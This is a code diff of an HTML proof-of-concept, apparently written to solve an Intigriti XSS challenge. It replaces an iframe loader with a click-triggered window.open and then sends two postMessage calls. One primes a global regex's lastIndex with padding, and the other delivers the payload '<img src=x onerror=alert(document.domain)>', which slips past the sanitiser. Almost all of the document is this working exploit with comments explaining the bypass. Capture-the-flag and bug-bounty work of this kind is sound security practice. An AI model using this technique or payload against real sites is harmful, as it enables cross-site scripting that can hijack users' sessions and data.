@@ -4,40 +4,33 @@
     <title>Intigriti Exploit</title>
 </head>
 <body>
-    <h1>Exploit Loading...</h1>
-    <iframe id="target" src="https://challenge-1225.intigriti.io" style="width:100%; height:500px;"></iframe>
+    <h1>Challenge Solved</h1>
+    <p>Click the button below to claim the bounty.</p>
+    
+    <button id="exploitBtn" style="font-size:20px; padding:20px;">Click to Solve</button>
 
     <script>
-        const targetFrame = document.getElementById('target');
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            // Open the target in a new window (Allowed because of the click)
+            const win = window.open("https://challenge-1225.intigriti.io", "targetWindow");
 
-        // Wait for the iframe to fully load before sending messages
-        targetFrame.onload = () => {
-            // Give the site a tiny moment to initialize its listeners
-            setTimeout(executeExploit, 500); 
-        };
+            // Wait for it to load, then fire the exploit
+            setTimeout(() => {
+                const targetOrigin = "https://challenge-1225.intigriti.io";
 
-        function executeExploit() {
-            const win = targetFrame.contentWindow;
-            const targetOrigin = "https://challenge-1225.intigriti.io";
+                // Step 1: Primer (Advance the regex)
+                // Use the exact logic you found: 100 chars + bad char
+                const padding = "A".repeat(100); 
+                const badChar = "<"; 
+                win.postMessage(padding + badChar, targetOrigin);
 
-            // --- STEP 1: THE PRIMER ---
-            // Send enough characters to advance the global regex 'lastIndex' 
-            // past the length of our actual payload.
-            // We append a "bad" character at the end to trigger the match 
-            // and update the regex state.
-            // Adjust '100' if necessary to ensure it's > payload length.
-            const padding = "A".repeat(100); 
-            const badChar = "<"; // The char that triggers the regex update
-            win.postMessage(padding + badChar, targetOrigin);
-
-            // --- STEP 2: THE ATTACK ---
-            // Immediately send the XSS payload. 
-            // Because the regex 'lastIndex' is now at 101 (or similar), 
-            // it starts searching *after* our payload ends.
-            // It finds nothing, considers it safe, and executes it.
-            const payload = "<img src=x onerror=alert(document.domain)>";
-            win.postMessage(payload, targetOrigin);
-        }
+                // Step 2: Payload (XSS)
+                // The regex is now desynchronized and will miss this payload
+                const payload = "<img src=x onerror=alert(document.domain)>";
+                win.postMessage(payload, targetOrigin);
+                
+            }, 2000); // 2-3 seconds wait to ensure page load
+        });
     </script>
 </body>
 </html>
